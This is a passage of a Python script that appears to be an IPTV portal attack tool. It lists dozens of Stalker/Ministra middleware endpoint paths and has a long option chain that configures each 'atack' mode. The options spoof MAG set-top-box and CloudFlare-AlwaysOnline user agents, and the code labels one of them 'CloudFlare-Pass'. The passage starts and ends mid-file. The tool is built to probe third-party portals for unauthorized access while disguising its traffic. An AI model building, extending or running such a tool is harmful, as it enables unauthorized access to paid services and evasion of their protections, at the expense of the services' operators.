    13 [1;32m=⫸ [0m [33m[ʀ]sᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴬᵀᴼᴹ⁾ [0m
    14 [1;32m=⫸ [0m [33m[s]sᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴳᴴᴼˢᵀ⁾ [0m
    15 [1;32m=⫸ [0m [33m[xɢ]sᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴳᴼᴸᴰ⁾ [0m
    16 [1;32m=⫸ [0m [33m[ᴜʟ]sᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᵁᴸᵀᴿᴬ⁾ [0m
    17 [1;32m=⫸ [0m [33msᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ➚⁽ˢˢ⁾ [0m
    18 [1;32m=⫸ [0m [33m[ɴxᴛ]ᴄ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    19 [1;32m=⫸ [0m [33m[ɴxᴛ]ᴄ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᵁᴸ-ˣᵁᴵ³⁾ [0m
    20 [1;32m=⫸ [0m [33m[ʀ]ᴄ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴿᵉᵃˡ-ˣᵁᴵ³⁾ [0m
    21 [1;32m=⫸ [0m [33m[s]ᴄ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ˢˢ-ˣᵁᴵ³⁾ [0m
    22 [1;32m=⫸ [0m [33mᴋ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    23 [1;32m=⫸ [0m [33mᴘ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    24 [1;32m=⫸ [0m [33mᴄᴘ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    25 [1;32m=⫸ [0m [33mʀᴍxᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    26 [1;32m=⫸ [0m [33mᴄᴍᴅғᴏʀᴇx.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    27 [1;32m=⫸ [0m [33mᴇᴅɢᴇ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    28 [1;32m=⫸ [0m [33mᴘᴏʀᴛᴀʟᴄᴄ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾[0m
    29 [1;32m=⫸ [0m [33mᴍᴀɢʟᴏᴀᴅ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    30 [1;32m=⫸ [0m [33mᴍᴀɢʟᴏᴀᴅ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴱˣᵀ⁾ [0m
    31 [1;32m=⫸ [0m [33mᴍᴀɢʟᴏᴀᴅ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    32 [1;32m=⫸ [0m [33mᴍᴀɢʟᴏᴠᴇ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    33 [1;32m=⫸ [0m [33mᴘᴏᴛᴀʟsᴛʙ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    34 [1;32m=⫸ [0m [33mᴘᴏᴛᴀʟsᴛʙ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    35 [1;32m=⫸ [0m [33mᴄʟɪᴇɴᴛ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    36 [1;32m=⫸ [0m [33mᴍᴀɢᴘᴏʀᴛᴀʟ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    37 [1;32m=⫸ [0m [33mᴍᴀɢᴀᴄᴄᴇss/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    38 [1;32m=⫸ [0m [33mᴘᴏᴡᴇʀғᴜʟʟ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    39 [1;32m=⫸ [0m [33mᴘᴏʀᴛᴀʟᴍᴇɢᴀ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    40 [1;32m=⫸ [0m [33mᴘᴏʀᴛᴀʟᴍᴇɢᴀ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    41 [1;32m=⫸ [0m [33mᴘᴏʀᴛᴀʟᴍᴇɢᴀ/ᴘᴏʀᴛᴀʟᴍᴇɢᴀ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    42 [1;32m=⫸ [0m [33mᴍɪɴɪsᴛʀᴀ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴿᵉᵃˡ-ˣᵁᴵ³⁾ [0m
    43 [1;32m=⫸ [0m [33mᴍɪɴɪsᴛʀᴀ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    44 [1;32m=⫸ [0m [33mᴋᴏʀɪsɴɪᴄɪ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    45 [1;32m=⫸ [0m [33mɢʜᴀɴᴅɪ_ᴘᴏʀᴛᴀʟ/sᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾[0m
    46 [1;32m=⫸ [0m [33mʙʟᴏᴡᴘᴏʀᴛᴀʟ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    47 [1;32m=⫸ [0m [33mᴇᴍᴜ2/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    48 [1;32m=⫸ [0m [33mᴇᴍᴜ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    49 [1;32m=⫸ [0m [33mᴇxᴛʀᴀᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    50 [1;32m=⫸ [0m [33mᴛᴇᴋ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    51 [1;32m=⫸ [0m [33mʟɪɴᴋ_ᴏᴋ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    52 [1;32m=⫸ [0m [33mʟɪɴᴋ_ᴏᴋ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    53 [1;32m=⫸ [0m [33mʙs.ᴍᴀɢ.ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    54 [1;32m=⫸ [0m [33mʙSᴛʀᴇᴀᴍ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    55 [1;32m=⫸ [0m [33mʙSᴛʀᴇᴀᴍ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    56 [1;32m=⫸ [0m [33mʙSᴛʀᴇᴀᴍ/ʙs.ᴍᴀɢ.ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    57 [1;32m=⫸ [0m [33mᴅᴇʟᴋᴏ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    58 [1;32m=⫸ [0m [33mᴅᴇʟᴋᴏ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    59 [1;32m=⫸ [0m [33m[s]sᴛᴀʟᴋᴇ.ᴘʜᴘ➚⁽ᴿ-ˣᵁᴵ³⁾ [0m
    60 [1;32m=⫸ [0m [33m[s]775GGʙsᴢʏ.ᴘʜᴘ➚⁽ˢˢ⁾ [0m
    61 [1;32m=⫸ [0m [33mᴘʟᴀʏ/ɪɴᴛᴇɢʀᴀᴛɪᴏɴ/sᴛᴀʟᴋᴇʀ➚⁽ᴺ⁾ [0m
    62 [1;32m=⫸ [0m [33mʀᴇᴀʟʙʟᴜᴇ.ᴘʜᴘ➚⁽ᴿᵉᵃˡᴮˡᵘᵉ⁾ [0m
    [40mResposta = [0m[31m[31m[31m""")
    print(' \x1b[0m')
    if phhp == '':
        print("""
[0mErrado: PHP não pode estar vazio, nem ser 1 ou 2!""")
        quit()
    if phhp == '0':
        uzmanm = input(' Write custom .php = \x1b[0m')
        albstb2 = '/' + uzmanm.replace('/portal', '').replace('.php', '') + '➚⁽ᶜᵘˢᵗᵒᵐ⁾'
        albstb3 = 'automatic.php➚⁽ᶜᵘˢᵗᵒᵐ⁾'
        uzmanmz = 'atack'
        pano = ''
        print(' ' + uzmanm + '\n')
    if phhp == '1':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portal.php'
        albstb2 = '➚⁽ᴼᴸᴰ⁾'
        uzmanmz = 'atack'
        albstb3 = 'portal.php⁽ᴼᴸᴰ⁾'
        agentx = 'Mᴀɢ200-ᴠ2Rᴇᴠ:250'
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'
    if phhp == '2':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portal.php'
        albstb2 = '➚⁽ᴬᵗᵗᵃᶜᵏ⁾'
        albstb3 = 'portal.php⁽ᴬᵗᵗᵃᶜᵏ⁾'
        uzmanmc = 'stbpro'
        uzmanmz = 'atack'
    if phhp == '3':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portal.php'
        albstb2 = '➚⁽ᶜˡᵒᵘᵈ⁾'
        uzmanmc = 'cloudflarex'
        albstb3 = 'automatic.php⁽ᶜˡᵒᵘᵈ⁾'
        attack = 'CʟᴏᴜᴅFʟᴀʀᴇ-Pᴀss'
        agentx = 'CʟᴏᴜᴅFʟᴀʀᴇ-Aɢᴇɴᴛ'
        uzmanmz = 'automatic'
        useragent = 'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/534.34'
    if phhp == '4':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portal.php'
        albstb2 = '➚⁽ˣᴷᶜ⁾'
        uzmanmz = 'atack'
        albstb3 = 'portal.php⁽ˣᴷᶜ⁾'
        agentx = 'MᴀɢX-v2-533'
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'
    if phhp == '5':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portal.php'
        uzmanmc = 'realblue'
        albstb2 = '➚⁽ᴬᵀᴼᴹ⁾'
        albstb3 = 'portal.php⁽ᴬᵀᴼᴹ⁾'
        uzmanmz = 'atack'
    if phhp == '6':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portal.php'
        uzmanmc = 'ultra'
        albstb2 = '➚⁽ᵁᴸᵀᴿᴬ⁾'
        albstb3 = 'portal.php⁽ᵁᴸᵀᴿᴬ⁾'
        uzmanmz = 'atack'
    if phhp == '7':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portal.php'
        uzmanmc = 'xgold'
        albstb2 = '➚⁽ᴳᴼᴸᴰ⁾'
        albstb3 = 'portal.php⁽ᴳᴼᴸᴰ⁾'
        uzmanmz = 'atack'
    if phhp == '8':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portal.php'
        albstb2 = '➚⁽ᴳᴴᴼˢᵀ⁾'
        uzmanmc = 'stalker_ss'
        albstb3 = 'portal.php⁽ᴳᴴᴼˢᵀ⁾'
        uzmanmz = 'atack'
    if phhp == '9':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'server/load.php'
        albstb2 = '➚⁽ᴼᴸᴰ²⁾'
        albstb3 = 'stalker_portal.php⁽ᴼᴸᴰ⁾'
        uzmanmz = 'atack'
        agentx = 'Mᴀɢ200-ᴠ2Rᴇᴠ:250'
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'
    if phhp == '10':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'server/load.php'
        albstb3 = 'stalker.php⁽ᴬᵗᵗᵃᶜᵏ⁾'
        albstb2 = '➚⁽ᴬᵗᵗᵃᶜᵏ⁾'
        uzmanmc = 'stbpro'
        uzmanmz = 'atack'
    if phhp == '11':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'server/load.php'
        albstb2 = '➚⁽ˣᴷᶜ²⁾'
        uzmanmz = 'atack'
        albstb3 = 'stalker.php⁽ˣᴷᶜ⁾'
        agentx = 'MᴀɢX-4-533'
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 4 rev: 1812 Mobile Safari/533.3'
    if phhp == '12':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'server/load.php'
        albstb2 = '➚⁽ᶜˡᵒᵘᵈ²⁾'
        pano = '/stalker_portal'
        uzmanmz = 'automatic'
        uzmanmc = 'cloudflarex'
        albstb3 = 'automatic.php⁽ᶜˡᵒᵘᵈ⁾'
        attack = 'CʟᴏᴜᴅFʟᴀʀᴇ-Pᴀss'
        agentx = 'CʟᴏᴜᴅFʟᴀʀᴇ-Aɢᴇɴᴛ'
        useragent = 'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/534.34'
    if phhp == '13':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'server/load.php'
        uzmanmc = 'realblue'
        albstb2 = '➚⁽ᴬᵀᴼᴹ²⁾'
        albstb3 = 'stalker.php⁽ᴬᵀᴼᴹ⁾'
        uzmanmz = 'atack'
    if phhp == '14':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'server/load.php'
        albstb2 = '➚⁽ᴳᴴᴼˢᵀ²⁾'
        uzmanmc = 'stalker_portal'
        albstb3 = 'stalker.php⁽ᴳᴴᴼˢᵀ⁾'
        uzmanmz = 'atack'
    if phhp == '15':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'server/load.php'
        uzmanmc = 'stalker_portal_1'
        albstb2 = '➚⁽ᴳᴼᴸᴰ²⁾'
        albstb3 = 'stalker.php⁽ᴳᴼᴸᴰ⁾'
        uzmanmz = 'atack'
    if phhp == '16':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'server/load.php'
        albstb2 = '➚⁽ᵁᴸᵀᴿᴬ²⁾'
        albstb3 = 'stalker.php⁽ᵁᴸᵀᴿᴬ⁾'
        uzmanmc = 'ultra'
        uzmanmz = 'atack'
    if phhp == '17':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'stalker_portal/server/load.php'
        panel = panel.replace('stalker_portal', '')
        uzmanmc = 'realblue'
        albstb2 = '/stalker_portal➚⁽ˢˢ⁾'
        albstb3 = 'stalker_portal.php⁽ˢˢ⁾'
        stbb = '/stalker_portal'
        ss = '/stalker_portal'
        pano = '/stalker_portal'
        uzmanmz = 'automatic'
        attack = 'Sᴛᴀʟᴋᴇʀ-Aᴛᴛᴀᴄᴋ-SS'
        agentx = 'Mᴀɢ266-ᴠ4Rᴇᴠ:533'
        useragent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'
    if phhp == '18':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'c/portal.php'
        albstb3 = 'portal.php⁽ˣᵁᴵ³⁾'
        albstb2 = '➚⁽ˣᵁᴵ³⁾'
        uzmanmc = 'stbpro'
        uzmanmz = 'atack'
    if phhp == '19':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'c/portal.php'
        albstb3 = 'stalker.php⁽ᵁᴸ-ˣᵁᴵ³⁾'
        albstb2 = '➚⁽ᵁᴸᵀᴿᴬ-ˣᵁᴵ³⁾'
        uzmanmc = 'ultra'
        uzmanmz = 'atack'
    if phhp == '20':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'c/portal.php'
        albstb2 = '➚⁽ᴿᵉᵃˡ-ˣᵁᴵ³⁾'
        uzmanmc = 'realblue'
        albstb3 = 'portal.php⁽ᴿᵉᵃˡ-ˣᵁᴵ³⁾'
        uzmanmz = 'atack'
    if phhp == '21':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'c/server/load.php'
        albstb2 = '➚⁽ˢˢ-ˣᵁᴵ³⁾'
        uzmanmc = 'stalker_ss'
        albstb3 = 'stalker.php⁽ˢˢ-ˣᵁᴵ³⁾'
        uzmanmz = 'atack'
    if phhp == '22':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'k/portal.php'
        albstb2 = '/k➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'k/portal.php⁽ˣᵁᴵ³⁾'
        uzmanmz = 'atack'
        stbb = '/k/c/'
    if phhp == '23':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'p/portal.php'
        albstb2 = '/p➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'p/portal.php⁽ˣᵁᴵ³⁾'
        uzmanmz = 'atack'
        stbb = '/p/c/'
    if phhp == '24':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'cp/server/load.php'
        albstb2 = '/cp➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'cp/stalker.php⁽ˣᵁᴵ³⁾'
        uzmanmz = 'atack'
        stbb = '/cp/c/'
    if phhp == '25':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'rmxportal/portal.php'
        albstb2 = '/rmxportal➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'rmxportal.php⁽ˣᵁᴵ³⁾'
        pano = '/rmxportal'
        stbb = '/rmxportal'
        uzmanmz = 'atack'
    if phhp == '26':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'cmdforex/portal.php'
        albstb2 = '/cmdforex➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'cmdforex.php⁽ˣᵁᴵ³⁾'
        pano = '/cmdforex'
        stbb = '/cmdforex'
        uzmanmz = 'atack'
    if phhp == '27':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'edge.php'
        albstb2 = '/edge➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'edge.php⁽ˣᵁᴵ³⁾'
        uzmanmz = 'atack'
        pano = '/edge'
        stbb = '/edge'
    if phhp == '28':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portalcc.php'
        albstb2 = '/portalcc➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'portalcc.php⁽ˣᵁᴵ³⁾'
        pano = '/portalcc'
        stbb = '/portalcc'
        uzmanmz = 'atack'
    if phhp == '29':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'magLoad.php'
        albstb2 = '/magLoad➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'magLoad.php⁽ˣᵁᴵ³⁾'
        pano = '/magLoad'
        stbb = '/magLoad'
        uzmanmz = 'atack'
    if phhp == '30':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'magLoad/magLoad.php'
        albstb2 = '/magLoad/Load➚⁽ᴱˣᵀ⁾'
        albstb3 = 'magLoad.php⁽ᴱˣᵀ⁾'
        pano = '/magLoad'
        stbb = '/magLoad'
        uzmanmz = 'atack'
    if phhp == '31':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'magLoad/portal.php'
        albstb2 = '/magLoad➚⁽ᵁᴸᵀᴿᴬ⁾'
        albstb3 = 'magLoad.php⁽ᵁᴸᵀᴿᴬ⁾'
        pano = '/magLoad'
        stbb = '/magLoad'
        uzmanmz = 'atack'
    if phhp == '32':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'maglove/portal.php'
        albstb2 = '/maglove➚⁽ˣᵁᴵ⁾'
        albstb3 = 'maglove.php⁽ˣᵁᴵ⁾'
        pano = '/maglove'
        stbb = '/maglove'
        uzmanmz = 'atack'
    if phhp == '33':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portalstb/portal.php'
        albstb2 = '/portalstb/p➚⁽ˣᵁᴵ⁾'
        albstb3 = 'portalstb.php⁽ˣᵁᴵ⁾'
        pano = '/portalstb'
        stbb = '/portalstb'
        uzmanmz = 'atack'
    if phhp == '34':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portalstb.php'
        albstb2 = '/portalstb➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'portalstb.php⁽ˣᵁᴵ³⁾'
        pano = '/portalstb'
        stbb = '/portalstb'
        uzmanmz = 'atack'
    if phhp == '35':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'client/portal.php'
        albstb2 = '/client➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'client.php⁽ˣᵁᴵ³⁾'
        pano = '/client'
        stbb = '/client'
        uzmanmz = 'atack'
    if phhp == '36':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'magportal/portal.php'
        albstb2 = '/magportal➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'magportal.php⁽ᴺᴼᴿ⁾'
        pano = '/magportal'
        stbb = '/magportal'
        uzmanmz = 'atack'
    if phhp == '37':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'magaccess/portal.php'
        albstb2 = '/magaccess➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'magaccess.php⁽ᴺᴼᴿ⁾'
        pano = '/magaccess'
        stbb = '/magaccess'
        uzmanmz = 'atack'
    if phhp == '38':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'powerfull/portal.php'
        albstb2 = '/powerfull➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'powerfull.php⁽ᴺᴼᴿ⁾'
        pano = '/powerfull'
        stbb = '/powerfull'
        uzmanmz = 'atack'
    if phhp == '39':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portalmega.php'
        albstb2 = '/portalmega➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'portalmega.php⁽ˣᵁᴵ³⁾'
        pano = '/portalmega'
        stbb = '/portalmega'
        uzmanmz = 'atack'
    if phhp == '40':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portalmega/portal.php'
        albstb2 = '/portalmega/p➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'portalmega/p.php⁽ᴺᴼᴿ⁾'
        pano = '/portalmega'
        stbb = '/portalmega'
        uzmanmz = 'atack'
    if phhp == '41':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'portalmega/portalmega.php'
        albstb2 = '/portalmega/pm➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'portalmega.php⁽ᴺᴼᴿ⁾'
        pano = '/portalmega'
        stbb = '/portalmega'
        uzmanmz = 'atack'
    if phhp == '42':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'ministra/portal.php'
        uzmanmc = 'realblue'
        albstb2 = '/ministra➚⁽ᴿᵉᵃˡ-ˣᵁᴵ³⁾'
        albstb3 = 'ministra.php⁽ᴿᵉᵃˡ-ˣᵁᴵ³⁾'
        pano = '/ministra'
        stbb = '/ministra'
        uzmanmz = 'atack'
    if phhp == '43':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'ministra/portal.php'
        albstb2 = '/ministra➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'ministra.php⁽ˣᵁᴵ³⁾'
        stbb = '/ministra/c/'
        pano = '/ministra'
        uzmanmz = 'atack'
    if phhp == '44':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'korisnici/server/load.php'
        albstb2 = '/korisnici➚⁽ˣᵁᴵ⁾'
        albstb3 = '/korisnici.php⁽ˣᵁᴵ⁾'
        stbb = '/korisnici/c/'
        pano = '/korisnici'
        uzmanmz = 'atack'
    if phhp == '45':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'ghandi_portal/server/load.php'
        albstb2 = '/ghandi➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'ghandi_portal.php⁽ᴺᴼᴿ⁾'
        stbb = '/ghandi_portal/c/'
        pano = '/ghandi_portal'
        uzmanmz = 'atack'
    if phhp == '46':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'blowportal/portal.php'
        albstb2 = '/blowportal➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'blowportal.php⁽ᴺᴼᴿ⁾'
        stbb = '/blowportal/c/'
        pano = '/blowportal'
        uzmanmz = 'atack'
    if phhp == '47':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'emu2/server/load.php'
        albstb2 = '/emu2➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'emu2/stalker.php⁽ᴺᴼᴿ⁾'
        stbb = '/emu2/c/'
        uzmanmz = 'atack'
    if phhp == '48':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'emu/server/load.php'
        albstb2 = '/emu➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'emu/stalker.php⁽ᴺᴼᴿ⁾'
        stbb = '/emu/c/'
        uzmanmz = 'atack'
    if phhp == '49':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'extraportal.php'
        albstb2 = '/extraportal➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'extraportal.php⁽ˣᵁᴵ³⁾'
        stbb = '/extraportal/c/'
        pano = '/extraportal'
        uzmanmz = 'atack'
    if phhp == '50':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'tek/server/load.php'
        albstb2 = '/tek➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'tek/stalker.php⁽ᴺᴼᴿ⁾'
        stbb = '/tek/c/'
        uzmanmz = 'atack'
    if phhp == '51':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'Link_OK/portal.php'
        albstb2 = '/Link_OK/p➚⁽ˣᵁᴵ⁾'
        albstb3 = 'Link_OK.php⁽ˣᵁᴵ⁾'
        stbb = '/Link_OK/c/'
        pano = '/Link_OK'
        uzmanmz = 'atack'
    if phhp == '52':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'Link_OK.php'
        albstb2 = '/Link_OK➚⁽ˣᵁᴵ³⁾'
        albstb3 = 'Link_OK.php⁽ˣᵁᴵ³⁾'
        stbb = '/Link_OK/c/'
        pano = '/Link_OK'
        uzmanmz = 'atack'
    if phhp == '53':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'bs.mag.portal.php'
        albstb2 = '/bs.mag➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'bs.mag.portal.php⁽ᴺᴼᴿ⁾'
        stbb = '/bs.mag.portal/c/'
        pano = '/bs.mag.portal'
        uzmanmz = 'atack'
    if phhp == '54':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'bStream/portal.php'
        albstb2 = '/bStream/p➚⁽ˣᵁᴵ⁾'
        albstb3 = 'bStream.php⁽ˣᵁᴵ⁾'
        stbb = '/bStream/c/'
        pano = '/bStream'
        uzmanmz = 'atack'
    if phhp == '55':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'bStream/server/load.php'
        albstb2 = '/bStream/s➚⁽ˣᵁᴵ⁾'
        albstb3 = 'bStream/stalker.php⁽ˣᵁᴵ⁾'
        stbb = '/bStream/c/'
        pano = '/bStream'
        uzmanmz = 'atack'
    if phhp == '56':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'bStream/bs.mag.portal.php'
        albstb2 = '/bStream/bs➚⁽ˣᵁᴵ⁾'
        albstb3 = 'bStream/bs.php⁽ˣᵁᴵ⁾'
        stbb = '/bStream/c/'
        pano = '/bStream'
        uzmanmz = 'atack'
    if phhp == '57':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'delko/server/load.php'
        albstb2 = '/delko/s➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'delko/stalker.php⁽ᴺᴼᴿ⁾'
        stbb = '/delko/c/'
        pano = '/delko'
        uzmanmz = 'atack'
    if phhp == '58':
        os.system("cls" if os.name == "nt" else "clear")
        uzmanm = 'delko/portal.php'
        albstb2 = '/delko/p➚⁽ᴺᴼᴿ⁾'
        albstb3 = 'delko/portal.php⁽ᴺᴼᴿ⁾'
        stbb = '/delko/c/'
        pano = '/delko'
        uzmanmz = 'atack'
    if phhp == '59':
        os.system("cls" if os.name == "nt" else "clear")
